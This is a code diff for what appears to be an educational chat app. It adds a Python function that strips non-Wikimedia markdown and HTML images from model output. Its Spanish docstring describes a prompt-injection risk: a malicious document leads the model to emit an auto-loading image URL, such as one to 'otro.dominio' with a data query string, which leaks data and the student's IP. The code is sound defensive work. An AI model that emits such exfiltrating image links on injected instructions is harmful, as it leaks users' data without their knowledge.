@@ -194,6 +194,37 @@ def _markdown(img: LicensedImage) -> str:
     return f"![{titulo}]({img.url})\n*Foto: {autor} · {licencia_md} · {pagina}*"
 
 
+#: Imagen markdown en línea (`![alt](url "título")`) y por referencia (`![alt][ref]`).
+_IMAGEN_MD = re.compile(r"!\[([^\]\n]*)\]\(\s*<?([^)\s>]*)>?(?:\s+[\"'][^\n]*?[\"'])?\s*\)")
+_IMAGEN_REF = re.compile(r"!\[([^\]\n]*)\]\[[^\]\n]*\]")
+#: `<img …>` escrito como HTML: el cliente no pinta HTML, pero no se deja pasar.
+_IMAGEN_HTML = re.compile(r"<img\b[^>]*>", re.I)
+
+
+def strip_foreign_images(content: str) -> str:
+    """Quita del texto del modelo toda imagen que no sea de Wikimedia (defensa en profundidad).
+
+    Una imagen se carga sola al pintar la respuesta: `![x](https://otro.dominio/p.png?d=…)`
+    sacaría datos en la URL y la IP del alumno sin un clic. Un documento con
+    instrucciones maliciosas podría provocarlo. El cliente ya solo carga Wikimedia; el
+    servidor tampoco las guarda ni las entrega. Se dejan como «[Imagen: alt]», igual
+    que las muestra el cliente. Pura.
+    """
+    if not content or ("![" not in content and "<img" not in content.lower()):
+        return content
+
+    def _texto(alt: str) -> str:
+        return f"[Imagen: {_texto_seguro(alt) or 'sin descripción'}]"
+
+    def _en_linea(m: re.Match) -> str:
+        return m.group(0) if m.group(2).startswith(_ORIGENES_IMAGENES) else _texto(m.group(1))
+
+    limpio = _IMAGEN_MD.sub(_en_linea, content)
+    # Las de referencia no las genera el servidor nunca: su URL va en otra línea.
+    limpio = _IMAGEN_REF.sub(lambda m: _texto(m.group(1)), limpio)
+    return _IMAGEN_HTML.sub(_texto(""), limpio)
+
+
 def place_images(content: str, found: dict[str, "LicensedImage | None"]) -> tuple[str, list[dict[str, str]]]:
     """Cambia cada marca por su foto con la atribución, o la quita. Pura.
 
